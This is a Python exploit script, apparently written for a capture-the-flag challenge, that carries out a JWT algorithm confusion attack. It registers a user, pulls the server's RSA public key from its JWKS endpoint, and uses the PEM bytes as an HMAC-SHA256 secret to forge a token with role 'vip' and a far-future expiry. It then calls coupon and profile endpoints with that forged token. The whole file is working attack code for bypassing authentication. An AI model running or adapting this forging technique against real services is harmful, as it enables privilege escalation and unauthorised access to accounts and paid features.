# JWT Algorithm Confusion Attack (RS256 -> HS256)
import requests, json, base64, hmac, hashlib
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.backends import default_backend

BACKEND = "http://instance.ctf.it.kmitl.ac.th:5165"

# ========== Step 1: Register & Login ==========
print("[*] Registering...")
r = requests.post(f"{BACKEND}/api/register", json={"username":"hacker999","password":"hacker999"})
print(f"    {r.status_code}: {r.text[:100]}")

print("[*] Logging in...")
r = requests.post(f"{BACKEND}/api/login", json={"username":"hacker999","password":"hacker999"})
data = r.json()
token = data.get("token")
print(f"    Token: {token[:80]}...")

# ========== Step 2: Get Public Key from JWKS ==========
print("[*] Fetching JWKS...")
r = requests.get(f"{BACKEND}/.well-known/jwks.json")
jwks = r.json()
key_data = jwks["keys"][0]

def b64url_to_int(s):
    s += "=" * (-len(s) % 4)
    return int.from_bytes(base64.urlsafe_b64decode(s), 'big')

n = b64url_to_int(key_data["n"])
e = b64url_to_int(key_data["e"])

pub_numbers = RSAPublicNumbers(e, n)
pub_key = pub_numbers.public_key(default_backend())
pem = pub_key.public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo
)
print(f"[*] Public Key PEM ({len(pem)} bytes)")

# ========== Step 3: Forge HS256 token with role=vip ==========
def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = json.dumps({"alg":"HS256","kid":"vip-key-1","typ":"JWT"}, separators=(',',':'))
payload = json.dumps({"exp":9999999999,"iat":1776570021,"role":"vip","sub":"hacker999"}, separators=(',',':'))

signing_input = f"{b64url_encode(header)}.{b64url_encode(payload)}"
sig = hmac.new(pem, signing_input.encode(), hashlib.sha256).digest()
forged_token = f"{signing_input}.{b64url_encode(sig)}"
print(f"\n[*] Forged VIP token:\n{forged_token}\n")

# ========== Step 4: Claim VIP Coupon ==========
headers = {"Authorization": f"Bearer {forged_token}"}
results = []

for method, ep in [("GET", "/api/coupon"), ("POST", "/api/coupon"), ("GET", "/api/profile")]:
    if method == "GET":
        r = requests.get(f"{BACKEND}{ep}", headers=headers)
    else:
        r = requests.post(f"{BACKEND}{ep}", headers=headers)
    results.append(f"{method} {ep}: {r.status_code} -> {r.text}")

with open("d:/itclash/jwt_result.txt", "w", encoding="utf-8") as f:
    f.write("\n\n".join(results))
print("[+] Results saved to jwt_result.txt")
